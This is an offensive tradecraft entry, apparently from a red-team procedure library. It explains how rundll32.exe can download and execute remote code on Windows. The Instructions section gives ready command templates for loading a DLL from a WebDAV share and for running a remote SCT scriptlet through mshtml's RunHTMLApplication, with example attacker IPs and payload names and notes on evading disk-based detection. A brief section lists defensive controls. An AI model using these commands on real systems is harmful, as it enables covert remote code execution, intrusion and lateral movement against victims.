---
id: 84735653-f00d-47e0-837b-707e8b568d05
name: Rundll32-Download-and-Execute-via-WebDAV-or-Remote-Script
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:26.898346+00:00'
updated_at: '2023-10-01T00:00:00+00:00'
tactics:
  - '[[tactics/Command and Control|TA0011 - Command and Control]]'
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Execution|TA0002 - Execution]]'
  - '[[tactics/Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
  - '[[techniques/Command-Line Interface|T1059 - Command-Line Interface]]'
  - '[[techniques/Native API|T1106 - Native API]]'
  - >-
    [[techniques/Obfuscated Files or Information|T1027 - Obfuscated Files or
    Information]]
  - '[[techniques/Ingress Tool Transfer|T1105 - Ingress Tool Transfer]]'
sub_techniques: []
tags:
  - '[[tags/rundll32]]'
  - '[[tags/windows-download-execute]]'
commands:
  - '[[commands/rundll32-webdav-dll-execute]]'
  - '[[commands/rundll32-javascript-sct-execute]]'
platforms:
  - Windows
tools: []
validated: true
---

# Rundll32-Download-and-Execute-via-WebDAV-or-Remote-Script

## Summary

This procedure uses the built-in Windows rundll32.exe utility to download and execute malicious code from remote sources, either a DLL via WebDAV or a script via JavaScript invocation of an SCT file. It enables in-memory execution to evade disk-based detection mechanisms like antivirus scanners, commonly used for initial payload delivery or lateral movement in Windows environments.

## Description

Rundll32.exe is a native Windows component designed to load and execute functions from DLL files. Adversaries repurpose it to fetch and run remote payloads without saving them to the local filesystem, reducing forensic footprints. The WebDAV method loads a DLL directly from a network share, while the remote script method uses MSHTML to interpret and execute a scriptlet (.sct) file over HTTP. This technique is effective against systems with outbound internet access but limited inbound controls, such as enterprise workstations. Prerequisites include command-line access on the target (e.g., via compromised credentials or initial shell) and an attacker-controlled server. Potential outcomes include reverse shell establishment, persistence, or further exploitation, with detection challenges due to the use of a signed system binary.

## Requirements

1. Command execution privileges on a Windows target (e.g., user-level shell or RDP access).
2. Attacker-controlled remote server: WebDAV-enabled for DLL hosting or HTTP for SCT files.
3. Network connectivity from target to server (ports 80/443 open; no proxy restrictions on UNC paths).
4. Prepared payload: A DLL with an exported entrypoint function or an SCT file containing executable script (e.g., VBScript for PowerShell download).

## Defense

- Application whitelisting via tools like AppLocker or WDAC to block or constrain rundll32.exe, especially with remote paths.
- Network monitoring for anomalous WebDAV (port 445) or HTTP requests to unusual domains/files (.dll, .sct).
- Enable Sysmon logging (Event ID 1 for process creation) and EDR rules for rundll32 spawning child processes or network activity.
- Patch management to address WebDAV vulnerabilities and restrict UNC path execution via Group Policy.
- Behavioral analytics to detect in-memory DLL loading or JavaScript execution from system binaries.

## Objectives

1. Load and execute a remote DLL in memory via WebDAV to run arbitrary code.
2. Fetch and interpret a remote SCT script using JavaScript to achieve code execution.
3. Establish payload functionality (e.g., C2 beacon) without creating local artifacts for evasion.

## Instructions

### Step 1: Execute Remote DLL via WebDAV

**Context**: This step connects to a WebDAV share, loads the specified DLL into the current process memory, and invokes its entrypoint function. It is ideal for delivering compiled payloads like reverse shells without triggering file-write monitors. Ensure the DLL has a valid export (e.g., 'Start' or 'Entry').

**Command** ([[commands/rundll32-webdav-dll-execute]]):
```cmd
rundll32 \\$_WEBDAV_SERVER\\$_SHARE\\$_DLL_NAME, $_ENTRYPOINT
```

> Substitute placeholders: e.g., \\192.168.1.100\\share\\payload.dll,Start. The command resolves the UNC path, maps the DLL, and calls the function. No console output is produced; monitor for payload effects like outbound connections. If the path is inaccessible, an error dialog may appear ("Module not found").

### Step 2: Execute Remote SCT Script via JavaScript

**Context**: This leverages rundll32 to invoke the MSHTML DLL's RunHTMLApplication method, creating a JavaScript context that downloads and executes an SCT file. SCT files can embed scripts for tasks like downloading additional payloads. This method is stealthy as it masquerades as browser activity.

**Command** ([[commands/rundll32-javascript-sct-execute]]):
```cmd
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://$_WEBSERVER/$_SCT_FILE");window.close()
```

> Replace with actual server and file: e.g., http://192.168.1.100/payload.sct. The JavaScript fetches the SCT, registers it as an object, and executes its content. A brief IE window may flash; close it manually if needed. Success is confirmed by the script's actions, such as command execution or file drops by the SCT payload. Errors occur if the URL is invalid or MSHTML is restricted.
